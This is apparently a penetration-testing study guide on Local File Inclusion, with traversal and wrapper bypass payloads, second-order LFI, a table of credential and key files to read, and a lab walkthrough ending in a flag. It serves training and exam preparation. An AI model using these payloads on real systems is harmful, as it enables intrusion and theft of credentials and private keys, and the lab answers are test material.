# Section 2 — Local File Inclusion (LFI)

---

## Detection

The classic pattern: a dropdown or link sets a parameter that the URL reflects.
```
http://TARGET/index.php?language=en.php   ← parameter loads a file
```

Quick test files (no credentials needed):
```bash
# Linux
curl -sk "http://TARGET/index.php?language=/etc/passwd"

# Windows
curl -sk "http://TARGET/index.php?language=C:\Windows\boot.ini"
```
> Substitutes the language parameter with a known file path. If the file contents appear in the response, the app is vulnerable to LFI. Use `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.

If the file contents appear in the response, the app is vulnerable.

---

## Three Common Inclusion Patterns + Their Bypasses

### 1. Direct inclusion (no prefix/suffix)
```php
include($_GET['language']);
```
Payload — works with absolute path:
```
?language=/etc/passwd
```

### 2. Directory prefix
```php
include("./languages/" . $_GET['language']);
```
Absolute path fails (`./languages//etc/passwd` doesn't exist). Use **path traversal**:
```
?language=../../../../etc/passwd
```
> Add extra `../` freely — going past `/` stays at `/`. Use 6-8 of them to be safe.

### 3. Filename prefix
```php
include("lang_" . $_GET['language']);
```
Plain traversal becomes `lang_../../../etc/passwd` → invalid. Add a leading `/` to make the prefix act like a directory:
```
?language=/../../../etc/passwd
```
> The `/` after `lang_` makes the path resolver treat `lang_` as a directory. Doesn't always work — `lang_/` may not exist. Then use PHP wrappers (next section).

### 4. Appended extension
```php
include($_GET['language'] . ".php");
```
`/etc/passwd` becomes `/etc/passwd.php` → file not found. Bypasses:
- Null byte (PHP < 5.3): `?language=/etc/passwd%00`
- PHP wrappers: `?language=php://filter/convert.base64-encode/resource=/etc/passwd`
- Truncation tricks (covered later)

---

## Counting the Right Number of `../`

The webroot is typically `/var/www/html/` → 3 levels deep from `/`. So `../../../etc/passwd` is the minimum. Adding more never hurts; fewer than needed fails silently.

Quick rule: `../` × 8 always works.

---

## Second-Order LFI

The user input isn't used directly — it's stored, then later used by a different feature without re-sanitization.

```
1. Register with username:   ../../../../etc/passwd
2. App stores username in DB
3. Visit /profile → app calls   include("/uploads/" . $user->name . "/avatar.png")
4. include() resolves to        /uploads/../../../../etc/passwd/avatar.png → traversal
```

Defenders often whitelist `?page=` but trust DB-sourced values like usernames. Probe stored fields (username, email, bio, custom display names) when direct LFI fails.

---

## Common Read Targets — Quick Reference

| File | What you get |
|------|-------------|
| `/etc/passwd` | User list (look for UIDs ≥ 1000 for human users) |
| `/etc/shadow` | Password hashes (root-only, usually 403) |
| `/etc/hosts` | Internal hostnames / pivot targets |
| `/proc/self/environ` | Env vars + log-poisoning sink |
| `/proc/self/cmdline` | Current process args |
| `/proc/self/status` | Current PID details |
| `/proc/net/tcp` | Listening ports + connections |
| `/var/www/html/index.php` | App source code (often via PHP wrapper) |
| `/var/www/html/config.php` | DB creds, secrets |
| `/var/log/apache2/access.log` | Apache log — set up for log poisoning |
| `/var/log/nginx/access.log` | nginx log |
| `/var/log/auth.log` | SSH login attempts → log poisoning via crafted username |
| `~/.ssh/id_rsa` | Private SSH key (try common users) |
| `~/.bash_history` | Recent commands, often with passwords |
| `/etc/apache2/sites-enabled/000-default.conf` | Webroot path |
| `C:\Windows\boot.ini` | Win 2003 — confirm Windows LFI |
| `C:\Windows\win.ini` | Win 7+ — confirm Windows LFI |
| `C:\xampp\apache\logs\access.log` | XAMPP Apache log |
| `C:\inetpub\logs\LogFiles\W3SVC1\` | IIS logs |

---

## Lab — Basic LFI

**Target:** `154.57.164.62:32641` — Inlane Freight language dropdown

### Q1 — User starting with "b"

Path traversal to `/etc/passwd`:
```bash
curl -sk "http://154.57.164.62:32641/index.php?language=../../../../etc/passwd" | grep '^[a-z]'
```
> Uses four levels of `../` to traverse out of the webroot and read `/etc/passwd`. The `grep '^[a-z]'` filters to lines starting with a lowercase letter, showing only real user accounts.

Result: `barry:x:1000:1000::/home/barry:/bin/sh` — UID 1000 = real user (vs `bin`/`backup` which are system accounts).

**Answer:** `barry`

### Q2 — Flag in `/usr/share/flags/flag.txt`

```bash
curl -sk "http://154.57.164.62:32641/index.php?language=../../../../usr/share/flags/flag.txt"
```
> Same traversal technique but targeting a different absolute path. The number of `../` sequences needed is the same because the webroot depth is the same.

**Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`

> The same `../../../../` traversal works for any absolute path on the system.

---

## Exam Notes

- Always start with `?param=/etc/passwd` (absolute), then `?param=../../../../etc/passwd` (traversal) — covers patterns 1 and 2
- If you see a verbose `failed to open stream` error, that's gold — the error reveals the exact final path being resolved
- For UID > 1000 users, check `/etc/passwd` shell column — `/bin/bash` or `/bin/sh` = real users; `/usr/sbin/nologin` = service accounts
- Production won't show errors — always test pattern 2 (path traversal) blindly; it's the most universal payload
- Second-order LFI is high-impact and overlooked — probe stored fields whenever direct injection fails
